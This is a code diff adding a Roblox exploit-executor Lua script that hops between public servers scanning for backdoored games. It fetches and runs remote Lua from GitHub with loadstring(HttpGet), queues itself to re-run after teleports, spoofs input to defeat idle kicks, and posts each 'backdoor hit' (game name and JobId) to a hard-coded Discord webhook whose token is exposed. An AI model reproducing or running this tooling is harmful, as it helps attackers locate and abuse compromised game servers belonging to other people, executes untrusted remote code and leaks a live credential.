@@ -1,0 +1,505 @@
+-- [[ INDUSTRIAL TITAN - V24 VOID-BREAKER CHASSIS ]] --
+-- [[ FORCED MEMORY EXPANSION - EXPLICIT PROPERTY OVERRIDE ]] --
+
+local success_text = "No backdoored"
+local script_url = "https://raw.githubusercontent.com/jLn0n/beckdeer-skenner/main/src/main.lua"
+local self_url = "https://raw.githubusercontent.com/TonyTeardown/scripts/refs/heads/main/bakad2"
+local webhook_url = "https://discord.com/api/webhooks/1487289258845802576/dXwi8nw8ptZZNEfWQiVLmBmNs0uSXGOXNRAR8cV_nDlDVJtSuDumUJlYB7_SEzVKiFqx" 
+
+local FinalScript = [===[
+    repeat task.wait() until game:IsLoaded()
+
+    -- [[ SECTION 1: GLOBAL SERVICES ]] --
+    local LogService = game:GetService("LogService")
+    local TeleportService = game:GetService("TeleportService")
+    local HttpService = game:GetService("HttpService")
+    local CoreGui = game:GetService("CoreGui")
+    local Players = game:GetService("Players")
+    local MarketplaceService = game:GetService("MarketplaceService")
+    local Stats = game:GetService("Stats")
+    local TweenService = game:GetService("TweenService")
+    local RunService = game:GetService("RunService")
+    local UserInputService = game:GetService("UserInputService")
+    local LocalPlayer = Players.LocalPlayer
+
+    -- [[ SECTION 2: SYSTEM REGISTRY ]] --
+    local found_success = false
+    local scan_completed = false
+    local is_minimized = false
+    local databaseName = "Sentinel_Titan_V24_Registry.json"
+    local currentJobId = tostring(game.JobId)
+    local placeId = tostring(game.PlaceId)
+    local webhook = "]===] .. webhook_url .. [===["
+    local gameName = "INIT_NODE_LINK"
+    local startTime = os.time()
+    
+    -- API CRAWLER LOGIC
+    local exhaustion_logs = {}
+    local current_sort_order = "Asc"
+    local shuffle_limit = 100
+    local skipCount = 0
+    local pageCount = 0
+    local currentCursor = ""
+
+    pcall(function()
+        local prodInfo = MarketplaceService:GetProductInfo(tonumber(placeId))
+        gameName = prodInfo.Name
+    end)
+
+    -- [[ SECTION 3: ANTI-AFK OVERRIDE ]] --
+    task.spawn(function()
+        local VirtualUser = game:GetService("VirtualUser")
+        LocalPlayer.Idled:Connect(function()
+            pcall(function()
+                VirtualUser:CaptureController()
+                VirtualUser:ClickButton2(Vector2.new(0,0))
+            end)
+        end)
+    end)
+
+    -- [[ SECTION 4: UI CONSTRUCTION - EXPLICIT PROPERTY BLOAT ]] --
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "Industrial_Titan_v24"
+    screenGui.ResetOnSpawn = false
+    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    screenGui.Parent = CoreGui
+
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Name = "MainFrame"
+    mainFrame.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
+    mainFrame.BorderSizePixel = 0
+    mainFrame.Active = true
+    mainFrame.Draggable = false
+    mainFrame.Size = UDim2.new(0, 560, 0, 550)
+    mainFrame.Position = UDim2.new(1, -580, 1, -570)
+    mainFrame.Parent = screenGui
+
+    local mainCorner = Instance.new("UICorner")
+    mainCorner.CornerRadius = UDim.new(0, 15)
+    mainCorner.Parent = mainFrame
+    
+    local mainStroke = Instance.new("UIStroke")
+    mainStroke.Color = Color3.fromRGB(0, 255, 150)
+    mainStroke.Thickness = 5
+    mainStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    mainStroke.Parent = mainFrame
+
+    local header = Instance.new("Frame")
+    header.Name = "Header"
+    header.Size = UDim2.new(1, 0, 0, 80)
+    header.Position = UDim2.new(0, 0, 0, 0)
+    header.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+    header.BorderSizePixel = 0
+    header.Parent = mainFrame
+
+    local hCorner = Instance.new("UICorner")
+    hCorner.CornerRadius = UDim.new(0, 15)
+    hCorner.Parent = header
+
+    local title = Instance.new("TextLabel")
+    title.Name = "TitleLabel"
+    title.Size = UDim2.new(1, -160, 1, 0)
+    title.Position = UDim2.new(0, 25, 0, 0)
+    title.Text = "TITAN v24.0 [VOID-BREAKER]"
+    title.TextColor3 = Color3.fromRGB(0, 255, 150)
+    title.BackgroundTransparency = 1
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 16
+    title.TextXAlignment = Enum.TextXAlignment.Left
+    title.Parent = header
+
+    local btnFrame = Instance.new("Frame")
+    btnFrame.Name = "ButtonFrame"
+    btnFrame.Size = UDim2.new(0, 130, 1, 0)
+    btnFrame.Position = UDim2.new(1, -140, 0, 0)
+    btnFrame.BackgroundTransparency = 1
+    btnFrame.Parent = header
+
+    local closeBtn = Instance.new("TextButton")
+    closeBtn.Name = "Close"
+    closeBtn.Size = UDim2.new(0, 40, 0, 40)
+    closeBtn.Position = UDim2.new(1, -50, 0.5, -20)
+    closeBtn.BackgroundColor3 = Color3.fromRGB(255, 30, 30)
+    closeBtn.Text = "X"
+    closeBtn.TextColor3 = Color3.new(1, 1, 1)
+    closeBtn.Font = Enum.Font.GothamBold
+    closeBtn.Visible = false
+    closeBtn.Parent = btnFrame
+    local cCorner = Instance.new("UICorner", closeBtn)
+    cCorner.CornerRadius = UDim.new(1, 0)
+
+    local minBtn = Instance.new("TextButton")
+    minBtn.Name = "Minimize"
+    minBtn.Size = UDim2.new(0, 40, 0, 40)
+    minBtn.Position = UDim2.new(1, -100, 0.5, -20)
+    minBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+    minBtn.Text = "-"
+    minBtn.TextColor3 = Color3.new(1, 1, 1)
+    minBtn.Font = Enum.Font.GothamBold
+    minBtn.Parent = btnFrame
+    local mCornerUI = Instance.new("UICorner", minBtn)
+    mCornerUI.CornerRadius = UDim.new(1, 0)
+
+    local content = Instance.new("Frame")
+    content.Name = "ContentWrapper"
+    content.Size = UDim2.new(1, 0, 1, -80)
+    content.Position = UDim2.new(0, 0, 0, 80)
+    content.BackgroundTransparency = 1
+    content.Parent = mainFrame
+
+    local grid = Instance.new("Frame")
+    grid.Name = "StatsGrid"
+    grid.Size = UDim2.new(1, -30, 0, 200)
+    grid.Position = UDim2.new(0, 15, 0, 15)
+    grid.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+    grid.Parent = content
+    local gCorner = Instance.new("UICorner", grid)
+    gCorner.CornerRadius = UDim.new(0, 12)
+    local gStroke = Instance.new("UIStroke", grid)
+    gStroke.Color = Color3.fromRGB(45, 45, 45)
+
+    -- MANUAL LABEL DEFINITIONS (BLOAT MODE)
+    local L1 = Instance.new("TextLabel")
+    L1.Name = "ExperienceLabel"
+    L1.Size = UDim2.new(0.5, -15, 0, 25)
+    L1.Position = UDim2.new(0, 15, 0, 15)
+    L1.Text = "EXP: " .. string.sub(gameName, 1, 18)
+    L1.TextColor3 = Color3.new(0.8, 0.8, 0.8)
+    L1.BackgroundTransparency = 1
+    L1.Font = Enum.Font.GothamSemibold
+    L1.TextSize = 10
+    L1.TextXAlignment = Enum.TextXAlignment.Left
+    L1.Parent = grid
+
+    local L2 = Instance.new("TextLabel")
+    L2.Name = "PingLabel"
+    L2.Size = UDim2.new(0.5, -15, 0, 25)
+    L2.Position = UDim2.new(0.5, 5, 0, 15)
+    L2.Text = "PING: 0ms"
+    L2.TextColor3 = Color3.new(0.8, 0.8, 0.8)
+    L2.BackgroundTransparency = 1
+    L2.Font = Enum.Font.GothamSemibold
+    L2.TextSize = 10
+    L2.TextXAlignment = Enum.TextXAlignment.Left
+    L2.Parent = grid
+
+    local L3 = Instance.new("TextLabel")
+    L3.Name = "DepthLabel"
+    L3.Size = UDim2.new(0.5, -15, 0, 25)
+    L3.Position = UDim2.new(0, 15, 0, 45)
+    L3.Text = "API DEPTH: 0"
+    L3.TextColor3 = Color3.fromRGB(0, 180, 255)
+    L3.BackgroundTransparency = 1
+    L3.Font = Enum.Font.GothamSemibold
+    L3.TextSize = 10
+    L3.TextXAlignment = Enum.TextXAlignment.Left
+    L3.Parent = grid
+
+    local L4 = Instance.new("TextLabel")
+    L4.Name = "DatabaseLabel"
+    L4.Size = UDim2.new(0.5, -15, 0, 25)
+    L4.Position = UDim2.new(0.5, 5, 0, 45)
+    L4.Text = "DATABASE: 0"
+    L4.TextColor3 = Color3.fromRGB(150, 150, 150)
+    L4.BackgroundTransparency = 1
+    L4.Font = Enum.Font.GothamSemibold
+    L4.TextSize = 10
+    L4.TextXAlignment = Enum.TextXAlignment.Left
+    L4.Parent = grid
+
+    local L5 = Instance.new("TextLabel")
+    L5.Name = "FullLabel"
+    L5.Size = UDim2.new(0.5, -15, 0, 25)
+    L5.Position = UDim2.new(0, 15, 0, 75)
+    L5.Text = "FULL SERVERS: 0"
+    L5.TextColor3 = Color3.fromRGB(255, 80, 80)
+    L5.BackgroundTransparency = 1
+    L5.Font = Enum.Font.GothamSemibold
+    L5.TextSize = 10
+    L5.TextXAlignment = Enum.TextXAlignment.Left
+    L5.Parent = grid
+
+    local L6 = Instance.new("TextLabel")
+    L6.Name = "SortLabel"
+    L6.Size = UDim2.new(0.5, -15, 0, 25)
+    L6.Position = UDim2.new(0.5, 5, 0, 75)
+    L6.Text = "SORT: ASCENDING"
+    L6.TextColor3 = Color3.fromRGB(255, 200, 0)
+    L6.BackgroundTransparency = 1
+    L6.Font = Enum.Font.GothamSemibold
+    L6.TextSize = 10
+    L6.TextXAlignment = Enum.TextXAlignment.Left
+    L6.Parent = grid
+
+    local L7 = Instance.new("TextLabel")
+    L7.Name = "MemoryLabel"
+    L7.Size = UDim2.new(0.5, -15, 0, 25)
+    L7.Position = UDim2.new(0, 15, 0, 105)
+    L7.Text = "MEM: 0MB"
+    L7.TextColor3 = Color3.fromRGB(100, 255, 100)
+    L7.BackgroundTransparency = 1
+    L7.Font = Enum.Font.GothamSemibold
+    L7.TextSize = 10
+    L7.TextXAlignment = Enum.TextXAlignment.Left
+    L7.Parent = grid
+
+    local L8 = Instance.new("TextLabel")
+    L8.Name = "UptimeLabel"
+    L8.Size = UDim2.new(0.5, -15, 0, 25)
+    L8.Position = UDim2.new(0.5, 5, 0, 105)
+    L8.Text = "UPTIME: 0s"
+    L8.TextColor3 = Color3.new(0.8, 0.8, 0.8)
+    L8.BackgroundTransparency = 1
+    L8.Font = Enum.Font.GothamSemibold
+    L8.TextSize = 10
+    L8.TextXAlignment = Enum.TextXAlignment.Left
+    L8.Parent = grid
+
+    local LS = Instance.new("TextLabel")
+    LS.Name = "StatusLabel"
+    LS.Size = UDim2.new(1, -30, 0, 30)
+    LS.Position = UDim2.new(0, 15, 0, 150)
+    LS.Text = "STATUS: INITIALIZING TITAN PROTOCOL..."
+    LS.TextColor3 = Color3.fromRGB(0, 255, 150)
+    LS.BackgroundTransparency = 1
+    LS.Font = Enum.Font.GothamBold
+    LS.TextSize = 11
+    LS.TextXAlignment = Enum.TextXAlignment.Left
+    LS.Parent = grid
+
+    local logScroll = Instance.new("ScrollingFrame")
+    logScroll.Name = "LogConsole"
+    logScroll.Size = UDim2.new(1, -30, 0, 220)
+    logScroll.Position = UDim2.new(0, 15, 0, 230)
+    logScroll.BackgroundColor3 = Color3.fromRGB(2, 2, 2)
+    logScroll.BorderSizePixel = 0
+    logScroll.Parent = content
+    local logLayout = Instance.new("UIListLayout")
+    logLayout.Padding = UDim.new(0, 3)
+    logLayout.Parent = logScroll
+
+    local function AddLog(msg, col)
+        local l = Instance.new("TextLabel")
+        l.Size = UDim2.new(1, -10, 0, 18)
+        l.BackgroundTransparency = 1
+        l.Text = " [" .. os.date("%X") .. "] " .. msg
+        l.TextColor3 = col or Color3.new(0.9, 0.9, 0.9)
+        l.Font = Enum.Font.Code
+        l.TextSize = 10
+        l.TextXAlignment = Enum.TextXAlignment.Left
+        l.Parent = logScroll
+        logScroll.CanvasSize = UDim2.new(0, 0, 0, logLayout.AbsoluteContentSize.Y + 20)
+        logScroll.CanvasPosition = Vector2.new(0, logLayout.AbsoluteContentSize.Y)
+    end
+
+    -- [[ SECTION 5: INTERACTION CONTROLLER ]] --
+    local dragging, dragInput, dragStart, startPos
+    header.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            dragging = true
+            dragStart = input.Position
+            startPos = mainFrame.Position
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragging = false
+                end
+            end)
+        end
+    end)
+    header.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement then
+            dragInput = input
+        end
+    end)
+    UserInputService.InputChanged:Connect(function(input)
+        if input == dragInput and dragging then
+            local delta = input.Position - dragStart
+            mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+    end)
+
+    minBtn.MouseButton1Click:Connect(function()
+        is_minimized = not is_minimized
+        content.Visible = not is_minimized
+        local targetSize = is_minimized and UDim2.new(0, 560, 0, 80) or UDim2.new(0, 560, 0, 550)
+        TweenService:Create(mainFrame, TweenInfo.new(0.4, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = targetSize}):Play()
+        minBtn.Text = is_minimized and "+" or "-"
+    end)
+
+    -- [[ SECTION 6: HEAVY REGISTRY ENGINE ]] --
+    local function GetRegistry()
+        AddLog("SYNCHRONIZING TITAN DATA-STREAMS...", Color3.new(1,1,1))
+        local s, r = pcall(function()
+            if isfile(databaseName) then
+                return HttpService:JSONDecode(readfile(databaseName))
+            end
+        end)
+        local reg = (s and type(r) == "table") and r or {}
+        if not reg[placeId] then
+            reg[placeId] = {}
+        end
+        L4.Text = "DATABASE: " .. #reg[placeId]
+        return reg
+    end
+
+    local GlobalRegistry = GetRegistry()
+    local CurrentSessionList = GlobalRegistry[placeId]
+
+    local function CommitNode(id)
+        local sid = tostring(id)
+        local ex = false
+        for _, v in pairs(CurrentSessionList) do
+            if v == sid then
+                ex = true
+                break
+            end
+        end
+        if not ex then
+            table.insert(CurrentSessionList, sid)
+            GlobalRegistry[placeId] = CurrentSessionList
+            pcall(function()
+                writefile(databaseName, HttpService:JSONEncode(GlobalRegistry))
+            end)
+            L4.Text = "DATABASE: " .. #CurrentSessionList
+            AddLog("CAPTURED NODE: .." .. string.sub(sid, -8), Color3.fromRGB(0, 255, 150))
+        end
+    end
+    CommitNode(currentJobId)
+
+    -- [[ SECTION 7: VOID-BREAKER ANALYZER ]] --
+    local obs = LogService.MessageOut:Connect(function(m)
+        local low = m:lower()
+        if string.find(low, "]===] .. success_text:lower() .. [===[" , 1, true) then
+            found_success = true
+        end
+        if string.find(low, "complete") or string.find(low, "finished") then
+            scan_completed = true
+        end
+    end)
+
+    AddLog("INJECTING OVERCLOCK DATA...", Color3.new(1, 1, 1))
+    pcall(function()
+        loadstring(game:HttpGet("]===] .. script_url .. [===["))()
+    end)
+
+    task.spawn(function()
+        while task.wait(0.5) do
+            pcall(function()
+                L2.Text = "PING: " .. math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue()) .. "ms"
+                L7.Text = "MEM: " .. math.floor(Stats:GetTotalMemoryUsageMb()) .. "MB"
+                L8.Text = "UPTIME: " .. (os.time() - startTime) .. "s"
+            end)
+        end
+    end)
+
+    local waitA = 0
+    while waitA < 35 do
+        if found_success then break end
+        if scan_completed and waitA > 5 then break end
+        waitA = waitA + 1
+        LS.Text = "STATUS: SCANNING (" .. waitA .. "s)"
+        task.wait(1)
+    end
+    obs:Disconnect()
+
+    -- [[ THE VOID-BREAKER RECOVERY MODULE ]] --
+    local function ForceReshuffle()
+        pageCount = 0
+        currentCursor = ""
+        current_sort_order = (current_sort_order == "Asc") and "Desc" or "Asc"
+        L6.Text = "SORT: " .. current_sort_order:upper()
+        shuffle_limit = math.random(10, 100)
+        AddLog("GHOST LOOP DETECTED. SHUFFLING API (Limit: "..shuffle_limit..").", Color3.fromRGB(255, 100, 0))
+        task.wait(5)
+    end
+
+    if found_success then
+        LS.Text = "STATUS: SAFE. DEPLOYING CRAWLER..."
+        local function RunTitanScan()
+            local q = (syn and syn.queue_on_teleport) or (queue_on_teleport) or (fluxus and fluxus.queue_on_teleport)
+            if q then
+                pcall(function()
+                    q(game:HttpGet("]===] .. self_url .. [===["))
+                end)
+            end
+
+            while true do
+                pageCount = pageCount + 1
+                L3.Text = "API DEPTH: " .. pageCount
+                AddLog("PENETRATING PAGE " .. pageCount .. " (" .. current_sort_order .. ")", Color3.fromRGB(0, 180, 255))
+                
+                local api = "https://games.roblox.com/v1/games/" .. placeId .. "/servers/Public?sortOrder=" .. current_sort_order .. "&limit=" .. shuffle_limit
+                if currentCursor ~= "" then
+                    api = api .. "&cursor=" .. currentCursor
+                end
+                
+                local ok, resp = pcall(function()
+                    return game:HttpGet(api)
+                end)
+                
+                if ok and resp then
+                    local decoded = HttpService:JSONDecode(resp)
+                    if decoded and decoded.data and #decoded.data > 0 then
+                        for _, node in pairs(decoded.data) do
+                            local id = tostring(node.id)
+                            if node.playing < node.maxPlayers and id ~= currentJobId then
+                                local known = false
+                                for _, s in pairs(CurrentSessionList) do
+                                    if id == s then
+                                        known = true
+                                        break
+                                    end
+                                end
+                                if not known then
+                                    AddLog("TARGET ACQUIRED. TELEPORTING...", Color3.fromRGB(0, 255, 100))
+                                    CommitNode(id)
+                                    TeleportService:TeleportToPlaceInstance(tonumber(placeId), id, LocalPlayer)
+                                    task.wait(6)
+                                end
+                            else
+                                skipCount = skipCount + 1
+                                L5.Text = "FULL SERVERS: " .. skipCount
+                            end
+                        end
+
+                        if decoded.nextPageCursor and decoded.nextPageCursor ~= "" then
+                            currentCursor = decoded.nextPageCursor
+                            task.wait(0.1)
+                        else
+                            AddLog("NATURAL EXHAUSTION. RESHUFFLING.", Color3.fromRGB(255, 200, 0))
+                            ForceReshuffle()
+                        end
+                    else
+                        AddLog("EMPTY PAGE HIT. BREAKING GHOST LOOP.", Color3.fromRGB(255, 50, 50))
+                        ForceReshuffle()
+                    end
+                else
+                    AddLog("API OVERLOAD. COOLING 15s.", Color3.new(1,0,0))
+                    task.wait(15)
+                end
+            end
+        end
+        RunTitanScan()
+    else
+        LS.Text = "STATUS: !!! THREAT CONFIRMED !!!"
+        mainStroke.Color = Color3.fromRGB(255, 50, 50)
+        closeBtn.Visible = true
+        pcall(function()
+            local payload = HttpService:JSONEncode({
+                ["username"] = "Titan Industrial v24",
+                ["embeds"] = {{
+                    ["title"] = "🎯 BACKDOOR HIT",
+                    ["color"] = 16711680,
+                    ["fields"] = {
+                        {["name"] = "Game", ["value"] = gameName},
+                        {["name"] = "JobId", ["value"] = currentJobId}
+                    }
+                }}
+            })
+            local req = (syn and syn.request) or (http and http.request) or http_request
+            req({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload})
+        end)
+    end
+]===]
+
+loadstring(FinalScript)()
